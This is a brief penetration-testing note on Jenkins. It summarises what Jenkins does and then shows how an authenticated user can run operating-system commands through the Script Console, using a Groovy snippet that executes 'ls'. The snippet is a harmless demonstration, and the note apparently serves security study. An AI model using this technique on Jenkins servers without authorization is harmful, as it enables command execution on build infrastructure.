What is Jenkins ?

Jenkins is a tool that offers a straightforward method for establishing a continuous integration or continuous delivery (CI/CD) environment for almost any combination of programming languages and source code repositories using pipelines. Furthermore, it automates various routine development tasks. While Jenkins doesn't eliminate the need to create scripts for individual steps, it does provide a faster and more robust way to integrate the entire sequence of build, test, and deployment tools than one can easily construct manually. [(source)](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security)

Groomy script exploitation: (need to be authenticated)
- Go to Manage Jenkins -> Script Console

```
def proc = "ls".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```

## Resources

[Github Repo on Jenkins exploits](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security)